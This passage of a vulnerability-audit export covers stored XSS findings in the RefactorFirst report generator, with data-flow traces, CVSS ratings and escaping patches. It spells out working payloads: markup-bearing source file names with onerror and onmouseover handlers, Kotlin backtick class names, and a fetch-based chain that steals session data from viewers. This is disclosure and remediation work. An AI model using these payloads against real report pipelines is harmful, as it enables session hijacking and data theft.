### Step 6 — `report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java:146,916-928`

Sink 2 (every report, both types, all consumption modes). `printProjectHeader()` — called unconditionally at :146 before
any branching — emits `"<a href=" + repoUrl + " target=\"_blank\">" + projectName + " " + projectVersion + "</a></h1>"`:
element-body interpolation, no escaping, no breakout needed for `<script>`.

### Step 7 — `report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java:363-368`

Sink 3. When the analyzed codebase yields no cycles/disharmonies (trivially forced by the attacker with a trivial or
empty source tree), the "Congratulations! NAME VERSION has no Cycles or Disharmonies!" `<div>` interpolates the values
raw into the element body.

### Step 8 — `report/src/main/java/org/hjug/refactorfirst/report/ReportWriter.java:14-40`

Persistence. The assembled HTML is written verbatim to `target/site/refactor-first-report.html` — a persistent artifact.

### Step 9 — `refactor-first-maven-plugin/src/main/java/org/hjug/mavenreport/RefactorFirstMavenReport.java:86`

Site-mode sink. `executeReport()` emits the same generateReport (...) output (including the raw `<h1>` header) through
`mainSink.rawText(report)`, which Doxia does not escape; only the site goal's `<title>` is escaped (:92,
`mainSink.text(...)`).

### Step 10 — `victim browser`

Execution. The victim opens the report (README: "View the report at target/site/refactor-first-report.html"; the project
also demonstrates web-hosted sample reports on rawcdn.githack.com) and the injected script executes in that context.

## Fix / patch notes

diff --git a/report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java
b/report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java ---
a/report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java +++
b/report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java @@ -362,7 +362,7 @@ if (!hasAnyDisharmony) {
stringBuilder .append ("<div style=\"text-align: center;\">Congratulations!  ")

-                    .append(projectName)

+                    .append(escapeHtmlLabel(projectName))
                     .append(" ")

-                    .append(projectVersion)

+                    .append(escapeHtmlLabel(projectVersion))
                     .append(" has no Cycles or Disharmonies!</div>");
             stringBuilder.append(renderClassGraphVisuals(repoUrl, codebaseGraphDTO));

@@ -924,7 +924,7 @@ + "<h1 align=\"center\"><a href=\"https://github.com/refactorfirst/refactorfirst\" target=\"_blank\"
"

+ "title=\"Learn about RefactorFirst\" aria-label=\"RefactorFirst\">RefactorFirst</a> Report for "

-                + "<a href=" + repoUrl + " target=\"_blank\">" + projectName + " "
-                + projectVersion + "</a></h1>\n";

+                + "<a href=" + repoUrl + " target=\"_blank\">" + escapeHtmlLabel(projectName) + " "
+                + escapeHtmlLabel(projectVersion) + "</a></h1>\n";
  } diff --git a/report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java
  b/report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java ---
  a/report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java +++
  b/report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java @@ -421,3 +421,4 @@ @Override public String
  printTitle (String projectName, String projectVersion) {

-        return "<title>Refactor First Report for " + projectName + " " + projectVersion + " </title>\n";

+        return "<title>Refactor First Report for " + escapeHtmlLabel(projectName) + " "
+                + escapeHtmlLabel(projectVersion) + " </title>\n";
  }

## References

- https://cwe.mitre.org/data/definitions/79.html
- https://cwe.mitre.org/data/definitions/80.html
- https://owasp.org/www-community/attacks/xss/
- https://maven.apache.org/doxia/developers/sink.html

---

_Rendered from original VulnHunter / VulnForge `report.yaml` by OpenVuln._

## [high] HTML report class-disharmony tables (SimpleHtmlReport.renderDisharmonyInfo) render analyzed-repo file names and raw absolute paths unescaped, enabling stored XSS — zero-interaction on Linux/macOS, hover-triggered on Windows via a space-named file — with session-class impact where reports are published to authenticated web origins, plus guaranteed host-path disclosure in every artifact

- key: `BUG-R2-S2-A1-H3`
- disclosure: owner_only
- cwe: CWE-79
- file: `../codebase-graph-builder/src/main/java/org/hjug/graphbuilder/graphbuilder/JavaSourceFileGraphBuilder.java`

# HTML report class-disharmony tables (SimpleHtmlReport.renderDisharmonyInfo) render analyzed-repo file names and raw absolute paths unescaped, enabling stored XSS — zero-interaction on Linux/macOS, hover-triggered on Windows via a space-named file — with session-class impact where reports are published to authenticated web origins, plus guaranteed host-path disclosure in every artifact

- **Project:** refactorfirst/RefactorFirst
- **Finding key:** BUG-R2-S2-A1-H3
- **CWE:** CWE-79
- **CVSS:** 7.4 (`CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N`)
- **EV priority:** P1
- **EV score:** 7
- **PoC status:** reproduced
- **EXP status:** confirmed
- **Affected versions:** XSS via payload file names confirmed at 0.9.0 and 0.10.0-SNAPSHOT (commit 65d3bef); not at
  0.8.0 (no data-class table rendered). Absolute-host-path disclosure (raw Path.toString () path recording) confirmed at
  0.10.0-SNAPSHOT only — released 0.9.0 renders repo-relative paths in hrefs and Full Path cells. CLI entry point
  non-functional in all tested versions (pre-existing picocli DuplicateOptionAnnotationsException); Gradle plugin is an
  empty stub at the audited commit; mvn-site report goal fails with a pre-existing NPE at the audited commit and 0.9.0

## Exploitability rationale

R:L — the attacker must get the victim to run RefactorFirst on a repository they control (the tool's documented primary
workflow: 'run from the root of your project'); file names ride any clone channel with no transport-level constraints
(unlike URL-shaped sources), but no network position or privileges are needed and user interaction is inherent. E:D —
the class-disharmony tables render by default in every working HTML entry point (Maven simpleHtmlReport/htmlReport
mojos; the CLI cannot start in any tested version due to a pre-existing picocli bug and the mvn-site report goal fails
with a pre-existing NPE), with no configuration that disables them; the raw-path mapping is the only path source for
class-level disharmonies. C:D — pure string-propagation logic with no encoding, filtering, or timing dependency: a file
name containing markup flows verbatim from Path.toString () to the HTML body, deterministic on Linux/macOS and for the
space-named attribute-injection shape on every OS. I:S — proven top impact: on any authenticated web origin that
publishes the report (the standard Jenkins-HTML-Publisher/CI-artifact-viewer pattern) the payload rides each viewer's
HttpOnly session and exfiltrates origin-protected data, propagating to every viewer; on the local file:// view the
impact is bounded to attacker-controlled rendering, a working outbound exfiltration channel of the victim's absolute
paths, and guaranteed host-path disclosure in the shareable artifact (which survives GitHub's step-summary sanitizer as
text) — significant, but not host-level code execution.

## Code anchors

| File                                                                                                      | Line | Function                                           |
|-----------------------------------------------------------------------------------------------------------|-----:|----------------------------------------------------|
| `../codebase-graph-builder/src/main/java/org/hjug/graphbuilder/graphbuilder/JavaSourceFileGraphBuilder.java` |   81 | `buildGraph`                                       |
| `../codebase-graph-builder/src/main/java/org/hjug/graphbuilder/metrics/MetricsCollectingVisitor.java`        |   46 | `visitCompilationUnit`                             |
| `../codebase-graph-builder/src/main/java/org/hjug/graphbuilder/metrics/MetricsVisitorLogic.java`             |   76 | `enterClass`                                       |
| `../cost-benefit-calculator/src/main/java/org/hjug/cbc/CostBenefitCalculator.java`                           |  145 | `getClassDisharmonies`                             |
| `../cost-benefit-calculator/src/main/java/org/hjug/cbc/CostBenefitCalculator.java`                           |  462 | `canonicaliseURIStringForRepoLookup`               |
| `../change-proneness-ranker/src/main/java/org/hjug/git/GitLogReader.java`                                    |  142 | `fileLog`                                          |
| `../cost-benefit-calculator/src/main/java/org/hjug/cbc/RankedDisharmony.java`                                |   86 | `RankedDisharmony(DisharmonyInstance, ScmLogInfo)` |
| `../report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java`                                | 1037 | `renderDisharmonyInfo`                             |
| `../report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java`                                | 1074 | `renderDisharmonyInfo`                             |

## Background

RefactorFirst is a developer/CI-side static-analysis tool (Maven plugin, Gradle plugin, CLI) that scores code
disharmonies (God Classes, Data Classes, cycles, etc.) in a Java/Kotlin codebase and emits HTML/CSV/JSON reports. Its
intended workflow is to run it against a cloned repository — including third-party repositories — and then open the
generated HTML report in a browser; the README additionally documents appending the report to $GITHUB_STEP_SUMMARY in
GitHub Actions and links sample reports hosted on rawcdn.githack.com (a web origin that serves raw HTML unsanitized).
The class-disharmony tables are produced by a pipeline that (1) parses every .java/.kt file with OpenRewrite, recording
each class's source file path in ClassMetrics, (2) converts those metrics into DisharmonyInstance rows in
CostBenefitCalculator, joining them with git change-proneness data keyed by path, and (3) renders each row in
SimpleHtmlReport.renderDisharmonyInfo as a hyperlinked file-name cell. The security-relevant property of this pipeline
is that the file *name* on disk is attacker-controlled input whenever the analyzed repository is not fully trusted, and
Linux/macOS file names may contain any bytes except '/' and NUL — including '<', '>', quotes and spaces.

## Description

The path pipeline uses two incompatible string conventions. The dependency-visitor family (cycle tables, method-level
disharmonies) records source paths via Path.toUri ().toString (), producing percent-encoded 'file://…' URIs; the metrics
family that feeds the class-disharmony tables records them via Path.toString () — the raw absolute filesystem path with
no scheme and no encoding (JavaSourceFileGraphBuilder.buildGraph sets each compilation unit's source path to the
absolute path, MetricsCollectingVisitor.visitCompilationUnit passes cu.getSourcePath ().toString () into
MetricsVisitorLogic.enterClass → ClassMetrics.setSourceFilePath). CostBenefitCalculator.getClassDisharmonies then calls
canonicaliseURIStringForRepoLookup () on that value, but that method only knows how to strip a 'file://<repoPath>/'
prefix — a prefix that is not present in a raw path — so the String.replace is an identity function and the raw absolute
path (with any markup embedded in the file name) passes through unchanged into DisharmonyInstance.fileRepoPath. The
change-proneness join does not drop these rows either: GitLogReader.fileLog returns a ScmLogInfo carrying the path
verbatim even when the git walk matches zero commits (an absolute path never matches a repo-relative tree path), so the
containsKey filter in calculateDisharmonyCostBenefitValues passes. RankedDisharmony then copies path =
scmLogInfo.getPath () and derives fileName = Path.of (path).getFileName ().toString () — both still raw. Finally,
SimpleHtmlReport.renderDisharmonyInfo emits the file name directly into an anchor's element body (
'<a href=' + repoUrl + rd.getPath() + ' target="_blank">' + rd.getFileName () + '</a>') with no HTML escaping — unlike
the sibling cycle-table renderer hyperlinkClass, which escapes its label with escapeHtmlLabel — and, when showDetails is
enabled, emits rd.getPath () raw into a 'Full Path' table cell. Because the injected '<img src=x onerror=…>' element
sits in element-body position, the browser parses it as live markup: the relative src fails to load and the onerror
handler executes attacker-controlled JavaScript. Independently of script execution, the Full Path column and the href
always embed the victim's absolute host path (home directory, username, project location) into a report artifact that is
routinely committed, shared, or published.

## Attack

Attacker (repository author) hosts a project containing the payload-named source file and a Data-Class-shaped class
inside it. A victim — a developer or CI job — clones the repository and runs any HTML-report entry point (e.g. 'mvn
org.hjug.refactorfirst.plugin:refactor-first-maven-plugin:simpleHtmlReport' from the repo root, the CLI, or the Gradle
plugin). The report is written to target/site/refactor-first-report.html. When the victim opens it in a browser (the
documented primary flow), the injected onerror handler executes JavaScript with ZERO interaction in the report's
context; when the report is published to an authenticated web origin (the standard Jenkins-HTML-Publisher /
CI-artifact-viewer / internal-dashboard pattern for Maven HTML reports) the payload rides each viewer's HttpOnly session
and exfiltrates origin-protected data to every viewer of the artifact (verified with a simulated quality hub: stolen
secrets including session id, deploy token, db password); on the local file:// view the impact is bounded to
attacker-controlled rendering plus an outbound exfiltration channel of the victim's absolute paths -- no local-file read
and no cookie access (Chromium blocks fetch to file: URLs). In all cases the committed/shared artifact discloses the
victim's absolute filesystem layout. On the GitHub Actions step-summary surface, GitHub's sanitizer strips every event
handler and script (verified by allowlist simulation) -- no XSS there, but the host-path text survives (standardized
/home/runner/work/... on GitHub-hosted runners; potentially identifying on self-hosted runners). Windows victims ARE
reachable via the space-named attribute-injection shape ('PwnW onmouseover=alert (11).java' is Win32-legal, the checkout
succeeds, the XSS is hover-triggered); only the zero-interaction element-injection shapes (needing '<'/'>') fail the
Windows checkout -- Linux/macOS victims (the default CI runner population) get zero-interaction execution.

### Payload

A source file in the analyzed repository named e.g. 'Pwn<img src=x onerror=alert(document.domain)>.java' (legal on
Linux/macOS), containing ordinary valid Java — the minimal trigger being a class with six public fields and no methods
(WOC=0.0, publicAttrs+accessors=6>5, WMC=0<31 → Data Class detection fires and the row renders in the default 'Data
Classes' table without any configuration). POC refinement: the class must be package-private (not public) so that
javac's file-name==public-class-name rule does not fail the victim's 'mvn clean test' — a package-private class in a
payload-named file compiles fine, so the README's exact 'mvn -B clean test …:simpleHtmlReport && … >> $
GITHUB_STEP_SUMMARY' CI flow succeeds end-to-end with the payload in place (verified). A space-free variant such as
'Pwn"onfocus=alert (1)//.java' additionally breaks out of the unquoted href attribute, and a newline-bearing name ('Pwn2
onmouseover=alert (2).java') terminates the unquoted href attribute value, injecting an onmouseover attribute onto the
anchor (verified). EXP refinement (real-scenario payload grammar): a file name can never contain '/' (any OS) and is
capped at 255 bytes per name, so impact payloads are slash-free -- URL slashes are assembled at runtime via
String.fromCharCode (47) -- and use a double-quoted HTML attribute with single-quoted JS strings; a 249-byte
session-ride payload
(PwnH<img src=x onerror="s=String.fromCharCode(47);fetch([s+'api','project-secrets'].join(s)).then(...beacon...)">.java)
was verified to steal origin-protected data, so the byte budget is not a capability limit. A space-named file 'PwnW
onmouseover=alert (11).java' is Win32/NTFS-legal (no < > : " / \ | ? *, no control bytes, no trailing dot/space, not a
reserved device name) -- the space terminates the unquoted href and injects the event-handler attribute, so this shape
reaches Windows victims (checkout succeeds; hover/click-triggered XSS). The same file name reaches the CSV first column
and the Google-Charts JavaScript literals in the full HtmlReport (sibling issues), so a single fixture exercises several
sinks.

## Data flow

### Step 1 —

`codebase-graph-builder/src/main/java/org/hjug/graphbuilder/graphbuilder/JavaSourceFileGraphBuilder.java:81-83`

buildGraph walks the analyzed repo (only filter: file name ends with '.java'), resolves each parsed compilation unit's
source path against the repo root to an ABSOLUTE path, and re-attaches it via cu.withSourcePath (absoluteSourcePath).
The Kotlin builder (KotlinSourceFileGraphBuilder.java:97-116) does the same for .kt files.

### Step 2 — `codebase-graph-builder/src/main/java/org/hjug/graphbuilder/metrics/MetricsCollectingVisitor.java:45-46`

visitCompilationUnit passes cu.getSourcePath ().toString () — the raw absolute path, NOT Path.toUri () — into
MetricsVisitorLogic.enterCompilationUnit (state.currentSourcePath).

### Step 3 — `codebase-graph-builder/src/main/java/org/hjug/graphbuilder/metrics/MetricsVisitorLogic.java:76`

enterClass stores the raw string on the class metrics: state.currentClassMetrics.setSourceFilePath
(state.currentSourcePath) → ClassMetrics.sourceFilePath =
'/home/victim/repo/src/main/java/…/Pwn<img src=x onerror=alert(1)>.java' (payload verbatim; no scheme, no
percent-encoding).

### Step 4 — `cost-benefit-calculator/src/main/java/org/hjug/cbc/CostBenefitCalculator.java:141-150`

getClassDisharmonies builds each DisharmonyInstance with canonicaliseURIStringForRepoLookup (sourceFilePath.replace (
'\\','/')).

### Step 5 — `cost-benefit-calculator/src/main/java/org/hjug/cbc/CostBenefitCalculator.java:462-467`

canonicaliseURIStringForRepoLookup only executes uriString.replace ('file://'+repositoryPath+'/', ''). The raw path has
no 'file://' prefix, so the replace matches nothing and returns the input unchanged — the canonicalization handshake is
broken and the raw absolute path flows into DisharmonyInstance.fileRepoPath.

### Step 6 — `change-proneness-ranker/src/main/java/org/hjug/git/GitLogReader.java:118-147`

fileLog (path) is called with the raw absolute path. The JGit log walk matches zero commits (an absolute path never
equals a repo-relative tree path), and the commitCount==0 branch still returns new ScmLogInfo (path, null,
earliestCommit, earliestCommit, 0) — the path verbatim. ChangePronenessRanker.rankChangeProneness ranks but never drops
entries, so the row survives the containsKey filter at CostBenefitCalculator.java:194-196.

### Step 7 — `cost-benefit-calculator/src/main/java/org/hjug/cbc/RankedDisharmony.java:86-87`

RankedDisharmony (instance, scmLogInfo) sets path = scmLogInfo.getPath () and fileName = Path.of (path).getFileName ()
.toString () — the last path segment, e.g. 'Pwn<img src=x onerror=alert(1)>.java', still raw.

### Step 8 — `report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java:1037-1038`

renderDisharmonyInfo emits drawTableCell ("<a href=" + repoUrl + rd.getPath () + " target=\"_blank\">" + rd.getFileName
() + "</a>") — getFileName () lands in the anchor's element body with NO escapeHtmlLabel (contrast hyperlinkClass at :
751-757 which escapes its label), and getPath () lands inside an unquoted href attribute. The
injected <img src=x onerror=…> element is parsed as live markup → script execution. Rendered by every HTML entry point:
Maven simpleHtmlReport/htmlReport mojos, CLI SIMPLE_HTML/HTML (HtmlReport extends SimpleHtmlReport).

### Step 9 — `report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java:1073-1074`

With showDetails=true, drawTableCell (rd.getPath ()) additionally emits the victim's absolute host path raw into the
'Full Path' cell — second injection position and guaranteed disclosure of the host's filesystem layout (username, home
directory) in the shareable artifact.

## Fix / patch notes

diff --git a/report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java
b/report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java ---
a/report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java +++
b/report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java @@ -763,5 +763,6 @@ * surrounding
anchor/table markup.
*/ static String escapeHtmlLabel (String label) {

-        return label.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;");

+        return label.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
+                .replace("\"", "&quot;").replace("'", "&#39;");
  } @@ -1034,7 +1035,8 @@ sb.append ("<tbody>\n"); for (RankedDisharmony rd : ranked) { sb.append ("<tr>\n");

-            sb.append(drawTableCell(
-                    "<a href=" + repoUrl + rd.getPath() + " target=\"_blank\">" + rd.getFileName() + "</a>"));

+            sb.append(drawTableCell(
+                    "<a href=\"" + escapeHtmlLabel(repoUrl + rd.getPath())
+                            + "\" target=\"_blank\">" + escapeHtmlLabel(rd.getFileName()) + "</a>"));
             if (methodLevel) {
                 String sig = rd.getMethodSignature();

@@ -1071,7 +1073,7 @@ sb.append (drawTableCell (rd.getCommitCount ().toString ())); if (showDetails) { sb.append
(drawTableCell (formatter.format (rd.getFirstCommitTime ())));

-                sb.append(drawTableCell(rd.getPath()));

+                sb.append(drawTableCell(escapeHtmlLabel(rd.getPath())));
             }
             sb.append("</tr>\n");
         }

diff --git a/cost-benefit-calculator/src/main/java/org/hjug/cbc/CostBenefitCalculator.java
b/cost-benefit-calculator/src/main/java/org/hjug/cbc/CostBenefitCalculator.java ---
a/cost-benefit-calculator/src/main/java/org/hjug/cbc/CostBenefitCalculator.java +++
b/cost-benefit-calculator/src/main/java/org/hjug/cbc/CostBenefitCalculator.java @@ -138,11 +138,11 @@
List<ClassDisharmony> raw = codebaseGraphDTO.getClassDisharmoniesOfType (disharmonyType);

         List<DisharmonyInstance> instances = raw.stream()
                 .map(d -> {
                     DisharmonyInstance instance = new DisharmonyInstance(
                             disharmonyType,
                             d.getClassName(),

-                            canonicaliseURIStringForRepoLookup(
-                                    d.getMetrics().getSourceFilePath().replace("\\", "/")),

+                            canonicaliseURIStringForRepoLookup(
+                                    Path.of(d.getMetrics().getSourceFilePath()).toUri().toString()),
                             d.getMetrics().getPackageName(),
                             null,

## References

- https://cwe.mitre.org/data/definitions/79.html
- https://cwe.mitre.org/data/definitions/80.html
- https://cwe.mitre.org/data/definitions/200.html
- https://owasp.org/www-community/attacks/xss/

---

_Rendered from original VulnHunter / VulnForge `report.yaml` by OpenVuln._

## [high] HTML reports render Kotlin class/cycle names and method signatures unescaped (cycle-summary table, 'Largest Class Cycle' <h2> heading, Duplicate Partners and package-edge cells), enabling stored XSS via backtick identifiers in the analyzed repository's Kotlin sources, with session-class impact on every viewer when the report is published to an authenticated web origin; the vulnerable Kotlin analysis is unreleased (no released version parses Kotlin sources)

- key: `BUG-R2-S2-A1-H4`
- disclosure: owner_only
- cwe: CWE-79
- file: `../codebase-graph-builder/src/main/java/org/hjug/graphbuilder/graphbuilder/KotlinSourceFileGraphBuilder.java`

# HTML reports render Kotlin class/cycle names and method signatures unescaped (cycle-summary table, 'Largest Class Cycle' <h2> heading, Duplicate Partners and package-edge cells), enabling stored XSS via backtick identifiers in the analyzed repository's Kotlin sources, with session-class impact on every viewer when the report is published to an authenticated web origin; the vulnerable Kotlin analysis is unreleased (no released version parses Kotlin sources)

- **Project:** refactorfirst/RefactorFirst
- **Finding key:** BUG-R2-S2-A1-H4
- **CWE:** CWE-79
- **CVSS:** 7.4 (`CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N`)
- **EV priority:** P1
- **EV score:** 7
- **PoC status:** reproduced
- **EXP status:** confirmed
- **Affected versions:** present only in the unreleased development head: 0.10.0-SNAPSHOT (commit 65d3bef, rewrite-bom
  8.90.4 / rewrite-kotlin 8.90.4 / kotlin-compiler-embeddable 2.4.10) — the unconditional Kotlin analysis
  (KotlinSourceFileGraphBuilder) first exists there. Verified NOT affected: released 0.9.0 (latest release, the version
  pinned by every README command — its simpleHtmlReport goal run on a payload fixture produces a payload-free 'has no
  Cycles or Disharmonies' report), and 0.8.0 / 0.7.1 (codebase-graph-builder contains zero Kotlin classes; no
  rewrite-kotlin dependency). The unescaped table sinks themselves predate the Kotlin analysis, but no released version
  has a markup-bearing source: Java identifiers cannot carry markup and the Java visitor's un-attributed fallback
  validates [A-Za-z_$][A-Za-z0-9_$]*, so no released version is reachable.

## Exploitability rationale

R:L — the attacker must control Kotlin source files of the repository the victim analyzes (public repo, PR contribution,
vendor archive, share — the tool's documented primary workflow includes analyzing third-party code); delivery is the
cheapest of this audit's report-injection vectors (plain source text; verified to ride fork-PR checkouts where the
clone's origin stays the base project; no .git internals, no transport constraints, fires on every OS) but is not
network-reachable. E:D — the sink renders on the default path of every entry point of the audited development head:
Kotlin parsing runs unconditionally on every *.kt/*.kts, cycle analysis defaults to on, and the cycle-summary table plus
the 'Largest Class Cycle' heading render in BOTH report flavors — including the lightweight simple report the README's
GitHub-Actions flow produces; the payload fires from a bare <img> element with zero script elements and zero external
subresources (no CDN, no script context, works fully offline). Release-status caveat: the Kotlin analysis is
unreleased — released 0.9.0/0.8.0/0.7.1 contain no Kotlin parsing at all (verified: the released 0.9.0 plugin on a
payload fixture produces a payload-free report), so real-world exposure materializes with the release that ships it
(0.10.0) unless fixed first. C:D — pure string propagation with no validation on the path; a single .kt file with two
mutually-referencing payload-named classes deterministically produces a cycle whose name renders raw; reproduced every
run, including through the exact README CI command (mvn -B clean test …:simpleHtmlReport) on a PR checkout. I:S — the
realistically achievable top impact is session hijack, not code execution: on an authenticated hosting origin (the
standard Jenkins-HTML-Publisher / CI-artifact-viewer publishing pattern for Maven HTML reports) the payload read the
origin's private data and each viewer's HttpOnly session id while acting as every viewer (verified in a simulated
dashboard for two independent viewers); on the documented local file:// flow the impact is bounded to
attacker-controlled rendering in a trusted context plus beacon egress (browsers block local-file reads, file:// has no
cookie surface — measured); the README's $GITHUB_STEP_SUMMARY flow does NOT carry the XSS (GitHub's user-content
sanitizer strips every script shape — verified by simulating the documented allowlist). Payload constraints
(backtick/newline grammar; '/' and '.' and '?' mangled or truncated by the rewrite-kotlin FQN path / getClassName split)
bound payload style only — the full exfiltration chain executed within them.

## Code anchors

| File                                                                                                        | Line | Function                       |
|-------------------------------------------------------------------------------------------------------------|-----:|--------------------------------|
| `../codebase-graph-builder/src/main/java/org/hjug/graphbuilder/graphbuilder/KotlinSourceFileGraphBuilder.java` |   52 | `buildGraph`                   |
| `../codebase-graph-builder/src/main/java/org/hjug/graphbuilder/visitor/KotlinDependencyVisitor.java`           |  111 | `visitCompilationUnit`         |
| `../codebase-graph-builder/src/main/java/org/hjug/graphbuilder/metrics/MetricsVisitorLogic.java`               |  727 | `buildMethodSignature`         |
| `../codebase-graph-builder/src/main/java/org/hjug/graphbuilder/metrics/DisharmonyDetector.java`                |  635 | `detectSignificantDuplication` |
| `../cost-benefit-calculator/src/main/java/org/hjug/cbc/CycleRanker.java`                                       |   85 | `identifyRankedCycles`         |
| `../report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java`                                  |  776 | `getRankedCycleSummaryData`    |
| `../report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java`                                  |  793 | `renderSingleCycle`            |
| `../report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java`                                  |  875 | `drawTableCell`                |
| `../report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java`                                  | 1045 | `renderDisharmonyInfo`         |
| `../report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java`                                  | 1068 | `renderDisharmonyInfo`         |

## Background

RefactorFirst is a developer/CI-side static-analysis tool (Maven plugin, Gradle plugin, picocli CLI) that parses a
Java/Kotlin codebase with OpenRewrite, builds class/package dependency graphs, detects cycles and code disharmonies, and
emits HTML/CSV/JSON reports. Its intended workflow is to run it against a cloned repository — including third-party
repositories — and open the generated HTML report in a browser; the README additionally documents appending the report
to $GITHUB_STEP_SUMMARY in GitHub Actions. Kotlin analysis runs unconditionally (CompositeGraphBuilder always invokes
KotlinSourceFileGraphBuilder, which walks the whole project directory for *.kt/*.kts and parses each file with
rewrite-kotlin's KotlinParser, including partial trees of files that fail to parse). The security-relevant property is
that Kotlin identifiers written between backticks may contain any characters except backtick and newline — including
spaces, '<', '>', '=', quotes — so every class name, method name and derived graph vertex derived from a Kotlin source
file is attacker-controlled free-form text whenever the analyzed repository is not fully trusted.

## Description

The report module builds HTML by raw StringBuilder concatenation with per-call-site ad-hoc escaping: escapeHtmlLabel
(escapes only & < >) is applied at exactly two sibling call sites (hyperlinkClass and the 1-arg renderClassEdge), one
cell hand-escapes '<'/'>' only, and the generic table cell renderer drawTableCell escapes nothing. The class-cycle
summary table renders getClassName (rankedCycle.getCycleName ()) — the representative class-graph vertex FQN of each
cycle — raw into <td> (SimpleHtmlReport:776 → drawTableCell:875-881), and renderSingleCycle renders the top-ranked
cycle's name raw into the element body of the <h2> 'Largest Class Cycle : …' heading (:792-795). Duplicate Partners are
rendered raw with only a ';'-to-<br> substitution (:1067-1069), method signatures with only '<'/'>' escaped (:1045), and
package vertex names raw via renderPackageEdge (:725-748). Upstream, the cycle name is a plain graph vertex string:
KotlinDependencyVisitor.visitCompilationUnit registers each Kotlin class as a vertex using type.getFullyQualifiedName ()
when attributed, or pkg + '.' + jcd.getSimpleName () when un-attributed (:99-118) — the latter with no identifier
validation, in contrast to the Java visitor's un-attributed fallback (UnattributedTypeFqnResolver.resolve) which rejects
names not matching [A-Za-z_$][A-Za-z0-9_$]*. Reading the exact pinned dependency sources resolves the decisive question
of what rewrite-kotlin 8.90.4 emits for backtick identifiers: (1) KotlinTreeParserVisitor.createIdentifier strips
exactly the leading/trailing backtick and stores the inner text verbatim as the J.Identifier simple name, so
jcd.getSimpleName () returns the raw payload even without attribution; (2) KotlinParser.parse always runs the full
Kotlin FIR frontend (buildFirFromKtFiles + AnalyseKt.runResolution) on every parse, and the Kotlin compiler's name
machinery applies no character validation — KtNamedDeclarationStub.getName () unquotes the identifier, Name.identifier
() is a bare constructor (the isValidIdentifier check is not invoked on this path), ClassIdCalculator builds the ClassId
by FqName.fromSegments = joinToString ('.'), and rewrite-kotlin's convertClassIdToFqn/convertKotlinFqToJavaFq transforms
only '.'→'$', '/'→'.' and strips '?' — spaces, angle brackets and quotes pass through into
JavaType.Class.fullyQualifiedName verbatim. Consequently a Kotlin class named `A <img src=x onerror=alert(1)>` in
package p1 becomes the graph vertex 'p1.A <img src=x onerror=alert(1)>' (surviving finalizeDto's
removeClassesNotInCodebase because its derived package p1 is a declared package), a two-class cycle between two such
classes makes that payload the RankedCycle.cycleName (CycleRanker:85), and the report emits it into element-body
positions where the browser parses it as live markup — script executes on page load with no interaction. The
method-signature path is a secondary vector: MetricsVisitorLogic.buildMethodSignature concatenates method.getSimpleName
() raw (:727), DisharmonyDetector builds partner strings as sigA + ' ↔ ' + simpleB + '.' + sigB (:635), and the partners
cell renders them unescaped. The codebase's own handling of Kotlin '<anonymous>' FQNs (escapeHtmlLabel javadoc,
HtmlReport.isAnonymousFqn, renderSafeNodeId) proves angle brackets already traverse this pipeline today in the very
sinks that lack escaping.

## Attack

Attacker (repository author, threat-model persona A1) hosts a project containing the crafted .kt file, or contributes it
via a pull request — the payload rides the PR head's source files while the victim's clone keeps the base repository as
origin (verified), so OSS projects whose CI runs RefactorFirst on incoming PRs are exposed. A victim — developer or CI
job — obtains the repository through any channel that carries source files and runs any HTML-report entry point (mvn
org.hjug.refactorfirst.plugin:refactor-first-maven-plugin:simpleHtmlReport or htmlReport, the mvn site report goal, or
the CLI); Kotlin analysis runs unconditionally with analyzeCycles enabled by default — the analyzed POM needs no Kotlin
compiler plugin (the .kt files are parsed, never compiled; a realistic 'Java project with a Kotlin migration spike'
shape), and the exact README GitHub-Actions command 'mvn -B clean test …:simpleHtmlReport' produces the poisoned report
with BUILD SUCCESS (verified). The report is written to target/site/. When the victim opens it in a browser (documented
primary flow; no CSP on file://), the injected <img onerror> executes attacker-controlled JavaScript at page load —
measured bounded impact on this surface: attacker-controlled rendering in a trusted context
(phishing/defacement/redirect) plus beacon egress; browsers block local-file reads and file:// has no cookie surface.
When the report is published into an authenticated web origin (the standard Jenkins-HTML-Publisher /
CI-artifact-viewer / internal-dashboard pattern for Maven HTML reports), the payload acts as every signed-in viewer:
same-origin retrieval of the origin's private data riding the victim's session (HttpOnly does not help) and exfiltration
to attacker infrastructure — verified in a simulated dashboard for two independent viewers, each losing their session id
and the origin's secrets. The README's $GITHUB_STEP_SUMMARY flow does NOT carry the XSS: GitHub's user-content sanitizer
strips every script shape (verified by simulating the documented allowlist; residual is inert text). Because the payload
rides source text rather than a file name, Linux, macOS and Windows victims are all exposed (unlike the file-name vector
in BUG-R2-S2-A1-H3), and no git history is required beyond the report generator needing a .git directory to exist at
all. Release status: the unconditional Kotlin analysis is unreleased — no released version (<=0.9.0, verified) parses
Kotlin sources, so exposure begins with the release that ships it (0.10.0) unless the sinks are fixed first.

### Payload

A single Kotlin source file in the analyzed repository, e.g. src/main/kotlin/p1/Cycle.kt containing 'package p1' plus
